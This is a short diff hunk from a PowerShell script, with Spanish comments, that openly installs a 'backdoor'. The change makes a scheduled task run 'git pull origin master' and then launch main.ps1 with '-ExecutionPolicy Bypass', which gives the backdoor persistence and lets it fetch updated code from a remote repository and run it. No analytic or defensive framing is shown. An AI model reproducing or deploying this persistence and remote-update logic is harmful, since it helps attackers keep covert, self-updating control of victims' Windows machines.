@@ -99,7 +99,7 @@ function download_backdoor {
 # Carga el backdoor como una tarea programada
 function load_backdoor {
 	
-	$argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
+	$argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; git pull origin master ; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
 
 	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_execute
 
